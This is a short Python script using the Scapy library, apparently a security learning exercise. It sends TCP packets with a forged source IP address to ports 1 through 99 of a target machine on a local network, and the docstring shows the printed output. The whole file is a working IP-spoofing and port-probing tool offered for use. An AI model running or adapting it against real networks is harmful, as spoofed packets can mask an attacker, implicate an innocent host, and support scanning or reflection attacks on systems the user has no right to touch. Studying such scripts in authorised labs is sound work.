'''
ToDo: Perform IP Spoofing on a Target Maching

Output:
Packet Sent to  192.168.4.125  from  192.168.4.107  on Port  1
Packet Sent to  192.168.4.125  from  192.168.4.107  on Port  2
Packet Sent to  192.168.4.125  from  192.168.4.107  on Port  3
...

Related Links: https://scapy.readthedocs.io/en/latest/

Author: Qaidjohar Jawadwala
'''

from scapy.all import * 
#No useless data on the screen
conf.verb = 0

#Target IP is the IP to which Packet is to be sent
target_ip = '192.168.4.125'
#Reflect IP is the IP be used as source IP	
reflect_ip = '192.168.4.107'

#Iterating through the Ports
for port in range(1,100):
	#Creating a Packet with Spoofed Source and Destination
	pkt = IP(src=reflect_ip,dst=target_ip)/TCP(dport=port)
	#Sending the Packet using Ethernet Interface. Can use wlan0 for WiFi
	send(pkt,iface="eth0")
	#Printing the details on the screen
	print "Packet Sent to ",target_ip," from ",reflect_ip," on Port ",port
